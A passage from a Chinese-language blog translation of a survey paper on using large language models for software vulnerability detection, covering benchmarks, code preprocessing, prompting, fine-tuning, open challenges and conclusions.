39]采用BLEU和ROUGE指标。BLEU考虑简洁惩罚和n-gram精确度，而ROUGE测量生成文本与参考文本之间的重叠。这些指标有助于评估基于LLM的漏洞检测系统的准确性和可解释性。</p><p><strong>RQ2答案</strong></p><p>​<br>&nbsp;&nbsp;&nbsp;&nbsp;大多数基于LLM的漏洞检测的基准和数据集关注函数级或文件级范围，C/C++作为主要目标语言。分类指标（如准确率和精确率）被广泛使用，马修斯相关系数（MCC）被用于不平衡数据集。BLEU和ROUGE等指标评估生成描述的质量，而执行时间评估效率。然而，当前数据集受限于对C/C++的关注和仓库级数据的缺乏。这些差距阻碍了LLMs跨语言泛化和检测复杂、多文件漏洞的能力。未来研究应创建多样化、大规模数据集以模拟现实世界场景。</p><h3 id="3-4-RQ3-LLM用于漏洞检测使用了哪些技术？"><a href="#3-4-RQ3-LLM用于漏洞检测使用了哪些技术？" class="headerlink" title="3.4 RQ3. LLM用于漏洞检测使用了哪些技术？"></a>3.4 RQ3. LLM用于漏洞检测使用了哪些技术？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;当前，基于LLM的漏洞检测面临几个关键挑战：（1）数据泄露导致性能指标膨胀；（2）难以理解复杂代码上下文；（3）大上下文窗口中的位置偏差导致信息丢失；（4）高误报率和对零日漏洞的性能差。研究人员已进行广泛研究以应对这些挑战。本节总结并讨论当前应用于基于LLM的漏洞检测的技术。</p><h4 id="3-4-1-代码数据预处理"><a href="#3-4-1-代码数据预处理" class="headerlink" title="3.4.1 代码数据预处理"></a>3.4.1 代码数据预处理</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;代码处理技术有两个主要目标：（1）优化LLMs有限上下文窗口的利用以提高效率；（2）增强LLMs对代码中语义信息的理解以提高漏洞检测能力。 </p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>抽象语法树分析</strong>。​​ 抽象语法树（AST）提供了程序结构的层次表示，其中代码元素基于其语法关系组织成树格式[118]。这种结构表示消除了非必要语法细节，同时保留了代码组件之间的语义关系。图8表示了一个代码片段的AST。AST在漏洞检测中的应用可分为几种主要方法：代码分割和结构表示，其中AST将代码解析为函数级片段以便在LLMs的上下文限制内高效处理，如Zhou等人[141]和Mao等人[83]所示；语义增强，其中AST与自然语言注释集成形成结构化注释树（SCT），如SCALE框架[119]中实现的那样，以捕获超越语法关系的漏洞模式；多图分析，其中AST与控制流图（CFG）和数据流图（DFG）结合以提供全面的代码结构分析，如DefectHunter[114]所示；与图注意力网络（GATs）集成的模式检测，如VulnArmor[104]、GRACE[77]和[82]所示；以及代码演化中的错误定位，如[137]所示。跨不同数据集（包括FFmpeg、QEMU和Big-Vul）的实证评估表明，AST增强方法显著提高了漏洞检测性能。</p><p><img src="http://hacky.wang/blog/20251030/ny3Jk5DfPeMy.png?imageslim" alt="mark"></p><p>​​&nbsp;&nbsp;&nbsp;&nbsp;<strong>数据/控制流分析</strong>。​​ AST缺乏程序数据和控制流的表示。因此，在一些论文[58, 66, 72, 75, 77, 106]中，数据流图（DFG）和控制流图（CFG）已被应用以帮助LLMs理解程序中的过程间数据流和控制流。图9是说明Java方法及其对应DFG的简明示例。DFG总结了程序中的可能执行路径，使用节点（或基本块，即顺序执行而无任何分支操作的语句）表示程序结构，边表示数据流。CFG具有与节点相同的基本块，但边用于表示基本代码块之间的分支操作。DFG/CFG主要有两种用法：在提示中提供额外上下文信息和知识库。将源代码与其DFG和CFG结合到提示中将显著提高LLM识别漏洞的性能[58, 72, 75, 77]；Sun等人提出DFG和CFG可用于知识库，通过基于图的相似性搜索算法，为LLMs提供具有相似数据和控制流结构代码段的信息[106]。除了DFG和CFG，调用图已用于漏洞检测[79]，为LLM提供有关函数间依赖关系的更多信息。<br><img src="http://hacky.wang/blog/20251030/TrB4ri0YyWgt.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>检索增强生成</strong>。​​ 检索增强生成（RAG）通过集成信息检索系统来增强LLMs的能力，该系统为LLMs提供额外相关信息[62]。图10说明了RAG的原理。LLMs接收用户输入并应用搜索器从知识库中查找相关文档或信息片段。检索到的信息与原始提示结合生成响应。通过这种方式，RAG可以解决LLMs在某些领域知识不足、幻觉以及大语言模型无法实时更新数据的问题。许多论文讨论了在构建LLMs的RAG时如何选择正确知识作为高优先级[12, 57, 59, 86, 106]。Cao等人直接使用CWE数据库作为外部知识[12]。许多论文关注将代码片段、静态分析结果与相应漏洞文档结合作为知识[57, 59, 86]。除了上述知识，Sun等人使用GPT-4总结现有知识从而创建两个知识库（带漏洞报告的VectorDB和总结知识）[106]。RAG已被证明能提高LLM检测漏洞的能力[57]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>程序切片</strong>。​​ 程序切片技术已用于减少与漏洞无关的代码行并保留与触发漏洞相关的关键行[13, 82, 96, 137]。Purba等人应用程序切片技术提取用于缓冲区溢出检测的代码片段[96]。这些代码片段通常包含关键函数，如strcmp和memset，以及调用这些函数的相关语句。Cao等人以类似方式使用程序切片[13]。他们首先找到所有潜在漏洞触发器，然后应用程序切片技术收集与这些触发器相关的所有语句。虽然Purba等人[96]和Cao等人[13]仅将程序切片技术用于代码预处理，但Zhang等人提出通过切片代码微调LLMs以提高LLMs漏洞检测的性能[137]。不是设置显式切片标准，LLMs在训练期间学习从给定函数中分离易受攻击代码行。这种方法帮助模型关注代码的相关部分并更准确地识别漏洞。程序切片技术已被证明能提高LLMs检测漏洞的能力[96, 137]。</p><p>​​&nbsp;&nbsp;&nbsp;&nbsp;<strong>LLVM中间表示</strong>。​​ 通过将源代码转换为LLVM中间表示（IR）[61]，分析和检测方法不需要专门适应不同编程语言。这提高了漏洞检测方法的多功能性，且LLVM IR还保留了程序结构和语义，使LLM更容易分析代码中的潜在依赖关系。但缺点明显：LLVM IR不适用于Java和Javascript。为使方法可泛化到编程语言，作者将源代码转换为LLVM IR并在这些IR上训练LLMs[82]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们可以看到，在LLMs漏洞检测领域，技术主要来自传统软件分析和LLM研究。基本上，这些技术的输出用作提示的一部分，以评估LLMs的漏洞检测能力。这些方法不仅优化了LLMs上下文窗口的利用效率，还通过保留或提取代码中的语义信息提高了其对潜在漏洞的理解。<strong>然而，它也不可避免地增加了令牌消耗，并且存在提示内容过多可能降低LLMs检测漏洞能力的可能性。</strong></p><p><strong>发现三</strong></p><p>​​<br>&nbsp;&nbsp;&nbsp;&nbsp;我们的分析显示，41.3%的研究采用了代码处理技术——包括图表示、检索增强生成（RAG）和代码切片——以更好地利用LLMs的有限上下文窗口。虽然这些方法相比直接代码提示显示出适度改进，但在处理复杂、跨文件漏洞时其有效性显著降低。值得注意的是，随着更大LLMs（如GPT系列）的出现，模型本身的性能增益往往超过代码处理技术的增益。这表明，虽然当前代码语义处理方法提供了好处，但开发更有效的复杂代码上下文表示方法仍然是关键挑战。</p><h4 id="3-4-2-提示工程技术"><a href="#3-4-2-提示工程技术" class="headerlink" title="3.4.2 提示工程技术"></a>3.4.2 提示工程技术</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;这是优化基于LLM的漏洞检测系统最广泛使用的策略之一，因为它通过定制输入提示实现对模型响应的精确控制。</p><p>​​&nbsp;&nbsp;&nbsp;&nbsp;<strong>思维链提示</strong>。​​ 思维链（CoT）提示是一种技术，其中LLMs被引导遵循逐步指令，在生成最终输出前增强推理准确性。图11说明了漏洞检测的CoT推理过程。在基于LLM的漏洞检测中，CoT提示涉及指示模型首先总结给定代码的功能，然后评估可能引入漏洞的潜在错误，最后确定代码是否易受攻击。这种结构化提示策略已被证明通过帮助模型以更有组织的方式推理复杂代码来提高漏洞检测任务中的精确率和召回率。然而，虽然CoT提示通常提高精确率，但其对召回率的影响在不同场景下可能不同[106]。</p><p><img src="http://hacky.wang/blog/20251030/63KkhyiS5m8m.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>少样本学习</strong>。​​ 在基于LLM的漏洞检测中，少样本学习（FSL）使模型能够利用提示中的一小部分标记示例来提高任务特定性能。在这种方法中，漏洞检测可以通过将分类标准（如CWE）直接嵌入提示中来增强[37]。通过合并CWE漏洞类别——包括编号和描述性名称——模型获得有助于准确识别和分类漏洞的上下文知识。图11也说明了少样本学习的原理，其中模型在分析新测试集前被提供标记示例（如Solidity Code 1和Solidity Code 2）以理解任务。这些示例与任务特定提示结合，指导微调后的LLM生成准确输出。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>分层上下文表示</strong>。​​ 分层上下文表示是一种用于在分析广泛代码库时管理LLMs上下文长度限制的技术。在漏洞检测中，代码可以分层组织为模块、类、函数和语句。通过以这种分层方式表示代码，LLM可以在不同抽象级别处理和分析代码。这种方法允许模型在深入详细代码段前关注更高级结构，有效管理上下文并在LLMs的最大输入长度限制内改进漏洞检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>多级提示</strong>。​​ 多级提示策略涉及将漏洞检测任务分解为多个提示，每个提示针对特定分析级别。不是将整个代码和任务呈现在单个提示中，该策略将过程分为阶段。例如，第一个提示可能要求LLM提供代码功能的高级摘要。第二个提示可能关注识别潜在安全问题，后续提示可能请求特定部分的详细分析。这种分层方法帮助LLM系统处理复杂代码，通过一次关注一个方面增强其检测漏洞的能力。图10说明了多级提示的实例。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>多提示代理和模板</strong>。​​ 该技术使用几个专门的提示代理，每个代理设计有特定模板以在漏洞检测过程中执行不同角色。例如，一个代理可能负责使用指导LLM提取关键功能的模板进行代码摘要。另一个代理可能关注漏洞识别，利用提示模型查找常见安全弱点的模板。通过使用具有定制模板的多个代理，系统利用每个专门提示的优势，导致更准确和全面的漏洞检测结果。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;总的来说，提示工程有效性随模型大小变化。小模型受益于少样本学习和结构化提示以补偿有限能力，而大模型因更强的泛化能力和领域知识，在思维链提示和零样本方法下表现更好。</p><p><strong>发现四</strong></p><p>​​<br>&nbsp;&nbsp;&nbsp;&nbsp;随着LLMs固有能力的增长，其上下文窗口容量相应扩展。思维链（CoT）提示成为大型模型（&gt;100亿参数）的主导方法，100%的最新研究采用CoT来增强生成。对于文本处理能力有限的小型模型，零样本或最小少样本方法证明更有效，因为CoT和额外的少样本示例可能导致不相关输出。</p><h4 id="3-4-3-微调"><a href="#3-4-3-微调" class="headerlink" title="3.4.3 微调"></a>3.4.3 微调</h4><p>&nbsp;&nbsp;&nbsp;&nbsp;微调帮助大语言模型（LLMs）更好地学习特定任务。它通过使用这些任务的新数据重新训练预训练模型来工作。微调对三个主要原因很重要[129, 140]：（1）代码中的安全问题遵循LLMs必须学习发现的特殊模式；（2）计算机代码与普通文本不同，因此LLMs需要学习如何更好地阅读和理解代码；（3）发现安全问题需要非常准确——遗漏真实问题或报告错误问题都会导致严重问题。如表5所示，约30%的研究选择微调现有LLMs作为其主要提出的方法。<br><img src="http://hacky.wang/blog/20251104/YgovXeDP8PRN.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>全参数微调（FFT）</strong>。FFT在训练期间更新所有模型参数。由于计算限制，大多数研究利用参数少于150亿的模型，如CodeT5、CodeBERT和UnixCoder。Ding等人[24]在70亿参数下实验了五个模型，即使在PrimeVul上训练和验证也仅达到0.21 F1分数。Guo等人[44]使用CodeBERT进行FFT 50轮，在PrimeVul上达到0.099 F1分数，但在Choi2017数据集上达到0.66 F1分数。Haurogne等人[46]在DiverseVul数据集上达到0.69 F1分数，而Purba等人[96]在缓冲区溢出检测中达到0.73 F1分数。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>参数高效微调（PEFT）</strong>。PEFT方法仅修改参数子集，同时保持大多数预训练权重冻结。适配器在原始模型层之间引入额外的可训练层，Yang等人[125]在故障定位中达到60% Top-5准确率。LoRA将权重更新表示为低秩分解，Du等人[25]等研究达到0.72 F1分数，Guo等人[44]在各自数据集上达到0.97 F1分数。QLoRA结合参数量化和LoRA，Boi等人[7]证明以更低内存使用达到59%准确率。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>判别式微调）</strong>。对于标记序列 X={x<br>1<br>​<br> ,x<br>2<br>​<br> ,…,x<br>L<br>​<br> }，模型处理它以输出漏洞标签。Zhang等人[137]和Yin等人[132]证明，微调后的CodeLlama相比未微调对应物实现0.62 F1分数改进。<br>&nbsp;&nbsp;&nbsp;&nbsp;<strong>生成式微调）</strong>。该方法支持序列到序列学习，用于生成结构化输出，如漏洞描述或易受攻击行识别。Yin等人[132]显示，在生成任务中微调预训练LMs优于微调LLMs，CodeT5+达到0.722 ROUGE分数，而DeepSeek-Coder 6.7B为0.425。</p><p><img src="http://hacky.wang/blog/20251104/JKRp4wDvyDnN.png?imageslim" alt="mark"></p><p><strong>发现五</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;微调通过全参数和参数高效方法（PEFT）增强基于LLM的漏洞检测。具有PEFT的大型模型（&gt;100亿）实现最佳结果，而基础模型如GPT-4和CodeLlama提供接近0.9的F1分数。判别式策略在精确检测中表现优异，需要至少10K样本的数据集。然而，计算限制和数据集质量仍然是关键挑战。</p><p><strong>RQ3答案</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;基于LLM的漏洞检测技术分为三类。首先，代码预处理——如AST分析、数据/控制流分析、RAG和程序切片——增强上下文利用但在复杂、跨文件漏洞方面挣扎。其次，提示工程——如CoT提示、少样本学习和专门代理——提高准确性，大型模型（&gt;100亿）受益于思维链方法，而较小模型偏好更简单提示。最后，微调——全参数和参数高效方法如LoRA——实现接近0.9的F1分数，特别是在大型模型中。随着模型进步，其固有优势可能超过预处理好处，突出需要解决复杂上下文和跨文件漏洞。</p><h3 id="3-5-RQ4-LLMs在检测漏洞时面临哪些挑战及解决它们的潜在方向？"><a href="#3-5-RQ4-LLMs在检测漏洞时面临哪些挑战及解决它们的潜在方向？" class="headerlink" title="3.5 RQ4. LLMs在检测漏洞时面临哪些挑战及解决它们的潜在方向？"></a>3.5 RQ4. LLMs在检测漏洞时面临哪些挑战及解决它们的潜在方向？</h3><p>&nbsp;&nbsp;&nbsp;&nbsp;该领域目前面临四个主要挑战，以及相应的潜在方向，如图12所示。首先，研究人员难以获得高质量数据集。其次，大语言模型（LLMs）在处理复杂漏洞时效果降低。第三，这些模型在现实世界仓库应用中成功有限。第四，模型缺乏强大的生成能力。多项研究证实这些挑战是进展的主要障碍。以下各节详细检查每个挑战。<br><img src="http://hacky.wang/blog/20251104/ofi75Fvnd8r4.png?imageslim" alt="mark"></p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>挑战1：研究问题范围有限</strong>：当前研究主要专注于确定给定代码片段是否易受攻击。在本综述中，约40项研究（83%）专注于分析孤立代码片段，其中LLM性能通常超过现实世界代码检测场景中观察到的结果[37]。虽然这为评估提供了受控环境，但它忽略了实际应用中的复杂性，如分析整个代码库或解决协作开发期间出现的漏洞。这表明仅关注孤立函数或片段的研究对现实世界场景用处有限。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>潜在方向</strong>：除了分析孤立代码段，未来研究应围绕现实世界开发中的以下关键问题构建：</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>按开发中代码演化分类的研究问题</strong>：</p><ul><li><strong>全量/增量检测</strong>：全量检测需要分析跨多个文件的整个代码库，而增量检测关注新代码提交。当前LLMs擅长分析孤立代码段，但在更广泛上下文方面挣扎[53]。因此，LLMs通常协助静态分析工具或支持模糊测试任务[80, 126, 127]，而非执行独立分析。对于提交级检测，现有方法将提交与静态分析结果结合[63, 128]，但在遇到训练语料库外API时可能失败[53]。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>按漏洞报告工作流分类的研究问题</strong>：</p><ul><li><strong>复现漏洞</strong>：漏洞复现将是未来研究的关键，也是减少误报的关键。对于每个检测到的漏洞，LLMs应尝试使用输入驱动（如模糊器）复现[53]。通过生成触发潜在漏洞的输入，LLMs可以提供漏洞存在的证据[122, 126]。该方法验证检测并确保发现可操作，从而提高漏洞报告可靠性。</li><li><strong>修复漏洞</strong>：虽然许多研究讨论了漏洞修复，但在现实世界项目中的实际实施仍然具有挑战性[143]。生产环境中成功的漏洞修复必须满足几个标准。<ul><li>修复代码必须通过所有现有测试</li><li>修复代码必须防止漏洞复现</li><li>修复代码不应引入新漏洞</li><li>当前数据集质量和LLM能力的限制阻碍了有效的漏洞修复验证。虽然LLMs可以识别易受攻击代码，但它们经常错误识别漏洞位置，导致不正确解释和修复。生成概念验证利用和模拟程序操作的能力将改进验证，但这需要LLM能力的显著进步[60]。</li></ul></li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>按漏洞特征分类的研究问题</strong>：</p><ul><li><p><strong>专门化漏洞检测</strong>：针对特定漏洞类别的定向检测方法开发代表了一个重大挑战。当前研究[36]证明LLMs在不同漏洞类型间表现出不同能力——在检测越界写入漏洞（CWE-787）时达到高准确率，而在缺失授权问题（CWE-862）上表现差。这种性能变化需要针对不同CWE类别的专门检测机制，特别是对于高频漏洞（如内存相关问题）。缺乏类别特定研究和数据集使这一关键领域 largely unexplored。</p></li><li><p><strong>漏洞分类和严重性评估</strong>：Alam等人[2]和Gao等人[36]强调两个基本挑战：首先，根据既定框架（如CWE）准确分类检测到的漏洞仍然困难。此分类问题对实际开发工作流至关重要，因为不同漏洞类型需要不同的修复方法。其次，预测漏洞严重级别直接影响修复优先级和时间表，高风险漏洞需要加速缓解。</p></li></ul><p><strong>发现六</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;在选择实验研究问题时，研究人员应优先考虑解决软件漏洞检测中的现实世界挑战。例如，研究可按代码库分析方法分类，如全量扫描或增量扫描，专注于全面或提交级漏洞检测。此外，基于现实世界开发中漏洞报告的邏輯工作流，研究可分为漏洞发现、复现和修复。除此之外，其他可行方向包括漏洞分类、严重性预测和针对特定漏洞类型的定向检测。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>挑战2</strong>：漏洞语义表示的复杂性。漏洞模式通常非常复杂[65]。超过95%的研究报告代码复杂性——如外部依赖、多个函数调用、全局变量和复杂软件状态——使漏洞检测困难。我们可以通过代码行数或圈复杂度[108]测量此复杂性，并使用程序依赖图（DFGs）或调用图可视化它。然而，大多数方法关注函数或文件级别的单个代码块[25, 137]，这对大项目帮助不大。处理复杂项目时，LLMs通常输入有限且面临许多”未见代码”[53]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;在更简单情况中——如来自合成数据集约500行的单个函数——LLMs可以很好检测漏洞，即使在零样本设置中[13, 122]。但许多研究表明需要更多信息处理更大项目[3, 37]，特别是在在线语料库稀疏时。这种情况下，我们必须提供额外文档和规范[136]。此外，一些函数依赖其调用者进行保护，因此单独分析它们可能导致不正确结论。我们需要给LLMs足够上下文以准确识别漏洞。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>潜在方向</strong>：两个核心方法可以应对此挑战。第一种方法专注于使LLMs能够阅读更多代码。这增加了它们对整个仓库的理解。第二种方法强调使用抽象表示简化代码语义。这增强了LLMs对代码结构和行为的理解。</p><ul><li><strong>动态代码知识扩展</strong>：通过反馈循环和自适应机制，应使LLMs能够自由访问和理解仓库代码[127, 136]。这将通过为漏洞分析提供更广泛上下文来解决高误报率。</li><li><strong>优化代码表示</strong>：研究[58, 72, 75, 77, 106]利用AST、CFG和DFG表示减少有限上下文窗口的令牌数。虽然当前实现尚未显著改进检测准确率，但未来研究机会包括复杂语义处理、多方法集成、更好上下文保存和混合图表示。</li><li><strong>专门化LLM代理</strong>：研究探索通过专门化LLM代理进行优化。研究[115]证明任务划分在多个代理间增加输出稳健性。每个代理</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>专门化LLM代理研究</strong> 探索通过专门化LLM代理进行优化。研究[115]证明任务划分在多个代理间增加输出稳健性。每个代理专注于漏洞检测的特定方面。提示工程研究[75]评估零样本、少样本和思维链方法对检测准确性的影响。然而，代码复杂性引入挑战。多个代理在复杂代码上显示准确性下降。少样本和思维链方法无法提供足够的额外上下文。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>与外部工具集成</strong> 外部工具提供重要支持机制。LangChain通过简化和异步LLM调用提高效率。检索增强生成（RAG）因其成本效益和效率而广受欢迎。研究[12, 26]实现RAG将代码上下文向量化，并通过基于LLM的检索增强检测。然而，代码上下文与自然语言有根本区别。这种差异需要代码语义提取、存储和比较的专门方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;这些优化技术可能弥合LLMs当前能力与大型代码库中现实世界漏洞检测复杂需求之间的差距。</p><p><strong>发现七</strong></p><p>漏洞的复杂性表明易受攻击代码通常涉及复杂的控制流。解决此问题需要提高LLMs高效存储和处理代码信息的能力。研究人员可以使用检索增强生成（RAG）或类似工具动态扩展知识。代码语义可以使用控制流图（CFGs）、抽象语法树（ASTs）或神经符号方法压缩。此外，可以在漏洞检测系统中使用针对特定任务优化的专门代理。这些方法提高了LLMs处理复杂代码结构的效率和有效性。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>挑战3：LLMs的内在限制。</strong>检测解决方案必须保持对数据变化和对抗攻击的稳健性[25]。然而，Yin等人[132]的研究揭示LLMs缺乏这种稳健性。它们显示对数据扰动的脆弱性。这些发现表明需要更可靠的方法。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;此外，LLMs需要更好的可解释性和一致性以用于现实世界应用。Haurogne等人和Du等人[25, 46]证明LLMs产生不一致的漏洞解释。它们无法保证每个实例的正确解释。输出在不同运行间显示随机性。即使LLMs正确识别易受攻击代码，它们也经常无法提供准确的漏洞解释。此限制对后续修复和审查过程造成显著问题。此领域的当前研究仍然不足。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;未来研究应聚焦这些关键领域：提高准确性、增强稳健性、增加输出可靠性和可解释性。这些改进将使基于LLM的解决方案更适用于现实世界使用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>潜在方向</strong>：此挑战的核心是提高LLMs固有的漏洞检测能力。研究人员可能聚焦训练新模型或微调LLMs。</p><ul><li><p><strong>微调前沿LLMs</strong>：关于缩放定律的最新发现[56]表明，更大的仅解码器语言模型，如GPT-4和Claude3.5-Sonnet，可以在模型大小、训练数据和计算缩放时实现系统性能改进。模型能力的改进增强漏洞检测、分类和解释。Alam等人[2]的研究显示，在相同提示下，GPT-4和GPT-3.5比早期模型如Llama2和CodeT5实现更高检测准确性。GPT-O1的发布，以其可见的推理过程，表明检测能力和输出可解释性的改进。微调方法显示前景。几项研究[2,13,25,44,81,84]微调开源模型如CodeLlama和CodeBERT。这些实现与通用LLMs相当的结果。然而，数据集限制呈现挑战。研究[113]表明实际应用需要至少100,000示例的数据集。这造成显著的训练成本障碍。研究人员可以通过以下方法增强漏洞检测性能：</p><ul><li><strong>漏洞特定微调</strong>：在特定漏洞类型上微调模型。研究[2,13,25]显示在特定漏洞类别（如内存相关问题、注入缺陷）上训练的模型实现更高检测准确性。此定向方法允许模型在每个漏洞类型内学习更深模式。</li><li><strong>仓库自适应微调</strong>：通过在仓库特定数据上微调使模型适应特定代码库。研究[45, 82]证明此方法通过帮助模型理解项目特定编码模式和架构改进检测准确性。此方法受益于具有独特编码约定的大型复杂项目。</li></ul></li><li><p><strong>集成学习和领域自适应预训练</strong>：结合来自多个模型的预测有效减少误报并改进检测准确性。DAPT可以通过利用包括公共记录（如NVD）和领域特定数据的策划数据集细化LLMs对特定上下文的理解。这实现更好识别利基漏洞和改进泛化。</p></li><li><strong>自适应学习机制</strong>：为解决安全威胁的动态性质并增强模型稳健性，自适应学习[85]机制允许通过反馈循环和定期再训练进行连续知识更新。高级优化技术可以进一步改进提示配置和学习率，确保现实世界应用中的可靠性。</li></ul><p><strong>发现八</strong><br>&nbsp;&nbsp;&nbsp;&nbsp;增强LLMs的稳健性和可解释性对有效漏洞检测至关重要。在特定漏洞类型（如内存问题或注入缺陷）上微调通过聚焦定向模式改进检测准确性。仓库自适应微调帮助模型学习项目特定编码约定，进一步提高准确性。集成学习结合来自多个模型的预测以减少误报，而领域自适应预训练（DAPT）使用策划数据集细化模型对利基上下文的理解。结合反馈循环和定期更新的自适应学习机制确保LLMs对演进威胁保持稳健。这些方法解决LLM限制并改进其现实世界适用性。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>挑战4</strong>：高质量数据集的缺乏。高质量漏洞基准数据集仍然稀缺。当前数据集面临几个问题。这些包括数据泄露、不正确标签、小规模和有限范围[17, 86, 121]。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;<strong>数据集不正确性</strong>：这些挑战中的关键问题是漏洞的错误标签，这损害数据集的可靠性和有效性。自动化收集方法[89]可以快速收集大量数据但无法确保正确标签而无需人工审查，导致许多误标或不准确注释样本。研究[121]也显示频繁数据泄露，因为LLMs经常训练于来源如GitHub、旧软件版本和外部库，版本控制或去重不足。结果，模型可能在测试期间遇到训练期间看到的相同数据，膨胀性能指标并破坏现实世界有效性。总之，漏洞检测的高质量数据集应满足几个要求。</p><ul><li><strong>准确标签</strong>：由于标签在监督学习中至关重要，不正确注释可能导致生产环境中的严重问题。</li><li><strong>最小数据泄露</strong>：在广泛代码库上训练的大规模LLMs风险在测试期间看到相同漏洞。对策包括代码混淆、合成和使用更新数据集。</li><li><strong>全面注释</strong>：对于仓库级数据，提供复现漏洞的调用序列和控制流，以及详细描述，帮助LLMs创建更可靠检测报告。</li></ul><p>&nbsp;&nbsp;&nbsp;&nbsp;**潜在方向：解决此挑战的关键在于研究人员聚焦基于特定研究范围构建数据集。如挑战1中讨论，基于LLM的漏洞检测中的不同研究问题需要不同类型的数据集，所有这些目前缺乏足够的准确数据或案例。研究人员应以聚焦特定研究问题的定向方式处理数据集构建。研究可以开发于：</p><ul><li><strong>数据集质量和范围增强</strong>：研究可以聚焦开发更小、高质量测试集以有效测量漏洞检测进展。一种方法结合来自多项研究[2,73,147]的现有验证样本。这创建研究社区可以随时间维护和扩展的可靠测试基准。此外，LLMs的最新进展，特别是具有128k上下文窗口的GPT-4o，实现全面仓库级漏洞分析，允许研究人员检测和修复整个代码库中的漏洞而非仅函数级。</li><li><strong>可扩展性和长尾漏洞处理</strong>：处理漏洞类型的长尾分布需要可扩展模型和数据增强技术[23,71]。为稀有漏洞类型生成合成样本可以改进LLMs检测低频率事件的能力。集成结构化信息，如CWE分类，可以进一步增强模型优先处理和处理关键漏洞的能力[5]。</li></ul><p><strong>发现九</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;高质量数据集对推进基于LLM的漏洞检测至关重要。具有详细注释（包括调用序列和控制流）的仓库级数据集增强现实世界适用性。与特定研究范围对齐的定向数据集解决独特检测挑战。合成数据生成减轻数据泄露并处理稀有漏洞类型。结合验证样本与可扩展数据增强确保仓库范围漏洞检测的稳健基准。</p><p><strong>RQ4答案</strong></p><p>&nbsp;&nbsp;&nbsp;&nbsp;基于LLM的漏洞检测的主要挑战包括研究范围、数据集质量、漏洞复杂性和模型稳健性。关键研究方向涉及改进模型能力、开发高级使用方法、增强数据集、加强检测稳健性和专门化漏洞检测方法。仍有长路要走。</p><h2 id="4-限制"><a href="#4-限制" class="headerlink" title="4 限制"></a>4 限制</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;几个因素可能影响本综述的全面性。首先，约60%的基于LLM的漏洞检测研究以预印本形式出现在arXiv上。这反映了该领域的新兴性质。其次，概念中的术语变化，如”LLM”和”漏洞检测”，可能导致初始搜索中的遗漏。为减轻这些风险，我们实施了系统方法。我们通过分析已建立会议和期刊的已发表论文开始。我们从这些来源提取核心关键词。在两个月期间，我们从约500篇论文优化选择至58项高度相关研究。本综述的未来版本将纳入此快速演进领域的新发展。此持续过程将确保更全面和及时的研究文献覆盖。</p><h2 id="5-结论"><a href="#5-结论" class="headerlink" title="5 结论"></a>5 结论</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;本研究呈现了LLMs在漏洞检测中应用的系统分析。通过广泛文献回顾，我们提供当前研究景观的全面检查，系统解决四个关键问题：LLMs在漏洞检测中的应用、评估基准和数据集的设计、当前技术方法和现有挑战与未来方向。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;我们的发现证明LLMs在代码理解和漏洞检测中展示显著潜力。通过微调和提示工程技术，LLMs可以有效改进检测准确性。跨多个基准数据集的实验表明，最近的大规模LLMs，如GPT-4和Claude-3.5，在漏洞检测任务中实现了显著进展。然而，在将LLMs应用于实际安全开发中仍存在重大挑战。主要障碍是高质量数据集的稀缺，这约束模型训练和评估。此外，当前LLMs在处理复杂代码结构和仓库级漏洞检测中显示显著限制。此外，关于输出随机性和模型可解释性的问题需要进一步调查。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;基于这些发现，我们提出几个有前景的研究方向：增强模型对代码演化的适应、改进漏洞复现和修复能力、开发高质量数据集和加强模型稳健性和可解释性。这些领域的进展将推动LLMs在漏洞检测中的更广泛采用。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;未来，我们计划通过添加更多漏洞相关任务（如漏洞定位、漏洞评估和漏洞修补）来丰富此综述。</p><p>​</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;LLMs在软件安全中的应用：漏洞检测技术综述与洞察&quot;&gt;&lt;a href=&quot;#LLMs在软件安全中的应用：漏洞检测技术综述与洞察&quot; class=&quot;headerlink&quot; title=&quot;LLMs在软件安全中的应用：漏洞检测技术综述与洞察&quot;&gt;&lt;/a&gt;LLMs在软件安全中的
      
    
    </summary>
    
      <category term="AI安全" scheme="https://findream.github.io/categories/AI%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MCP Server开发和调试</title>
